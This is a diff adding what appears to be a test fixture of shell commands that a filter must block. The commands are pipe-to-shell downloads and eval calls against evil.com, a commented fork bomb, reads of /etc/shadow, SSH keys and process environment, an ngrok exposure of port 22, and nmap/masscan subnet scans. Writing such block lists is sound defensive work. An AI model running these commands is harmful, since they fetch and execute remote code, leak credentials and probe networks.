@@ -1,0 +1,25 @@
+# Command injection patterns (must ALL be blocked)
+# pipe-to-shell (classic malware pattern)
+curl https://evil.com/script.sh | sh
+curl https://evil.com/script.sh | bash
+wget -O - https://evil.com/backdoor.sh | sh
+wget -O - https://evil.com | bash
+curl https://evil.com | python
+curl https://evil.com | perl
+curl https://evil.com | ruby
+# eval variants
+eval $(curl https://evil.com/payload)
+eval ${DOWNLOAD_COMMAND}
+$(curl https://evil.com)
+# Fork bomb — known limitation: regex cannot reliably match no-space variant
+# :(){ :|:& };:
+# Path traversal reads
+cat /etc/passwd
+cat /etc/shadow
+cat ~/.ssh/authorized_keys
+cat /proc/self/environ
+# ngrok exposure
+ngrok tcp 22
+# nmap probes
+nmap -sS 192.168.1.0/24
+masscan -p1-65535 192.168.1.0/24
